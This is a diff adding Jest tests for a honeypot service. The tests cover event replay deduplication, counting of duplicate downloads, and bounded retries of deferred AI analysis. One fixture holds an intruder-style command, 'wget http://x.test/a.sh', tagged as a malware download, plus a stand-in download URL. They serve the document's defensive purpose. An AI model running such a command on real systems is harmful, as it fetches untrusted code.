@@ -94,6 +94,63 @@ describe('atomic honeypot activity and stale-session sweep', () => {
     expect(s.iocExtracted.hashes).toEqual(['ab'])
   })
 
+  test('3.5: a replayed command event (same eventId) is applied once and alerts once', async () => {
+    await newSession('replay')
+    const event = {
+      sessionId: 'replay',
+      sourceIP: '198.51.100.20',
+      command: 'wget http://x.test/a.sh',
+      intent: 'MALWARE_DOWNLOAD',
+      eventId: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
+    }
+    const first = await collector.onCommandReceived(event)
+    const second = await collector.onCommandReceived(event)
+    expect(first.$locals.duplicateEvent).toBeUndefined()
+    expect(second.$locals.duplicateEvent).toBe(true)
+    await collector.onCommandReceived({ ...event, eventId: 'ffffffffffffffffffffffffffffffff' })
+    const s = await HoneypotSession.findOne({ sessionId: 'replay' }).select('+ingestEventIds')
+    expect(s.commands).toHaveLength(2)
+    expect(s.ingestEventIds).toHaveLength(2)
+    expect(await mongoose.connection.db.collection('alerts').countDocuments()).toBe(2)
+    expect((await HoneypotSession.findOne({ sessionId: 'replay' }).lean()).ingestEventIds).toBeUndefined()
+  })
+
+  test('3.5: a doubly delivered download (same eventId) counts once', async () => {
+    await newSession('dl-twice')
+    const event = {
+      sessionId: 'dl-twice',
+      sourceIP: '198.51.100.20',
+      url: 'http://x.test/a',
+      eventId: 'abcdef0123456789',
+    }
+    await collector.onFileDownload(event)
+    await collector.onFileDownload(event)
+    const s = await HoneypotSession.findOne({ sessionId: 'dl-twice' })
+    expect(s.downloadCount).toBe(1)
+    expect(await mongoose.connection.db.collection('alerts').countDocuments()).toBe(1)
+  })
+
+  test('3.5: a closure without the AI engine is flagged and retried by the sweep, a bounded number of times', async () => {
+    await newSession('ai-down')
+    const s = await HoneypotSession.findOne({ sessionId: 'ai-down' })
+    await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 30 } })
+    let closed = await HoneypotSession.findById(s._id)
+    expect(closed.closureAnalysisState).toBe('complete')
+    expect(closed.aiAnalysisPending).toBe(true)
+    expect(closed.deceptionScoringPending).toBe(true)
+
+    const sweep = new HoneypotSweepService({ retryMinutes: 5, maxAnalysisAttempts: 2 })
+    expect((await sweep.retryDeferredAnalysis()).found).toBe(0) // not due yet
+    const later = () => new Date(Date.now() + 10 * 60000)
+    expect(await sweep.retryDeferredAnalysis(later())).toEqual({ found: 1, completed: 0, stillPending: 1 })
+    expect(await sweep.retryDeferredAnalysis(later())).toEqual({ found: 1, completed: 0, stillPending: 1 })
+    expect((await sweep.retryDeferredAnalysis(later())).found).toBe(0) // attempts exhausted
+    closed = await HoneypotSession.findById(s._id)
+    expect(closed.deferredAnalysisAttempts).toBe(2)
+    expect(closed.closureAnalysisState).toBe('complete')
+    expect(closed.aiAnalysisPending).toBe(true)
+  })
+
   test('M6: honeypot analytics only aggregate the 7-day reporting window', async () => {
     await newSession('recent', { commands: [{ command: 'id' }], deceptionScore: 10 })
     await newSession('ancient', { commands: [{ command: 'old-cmd' }], sourceIP: '203.0.113.99', deceptionScore: 90 })
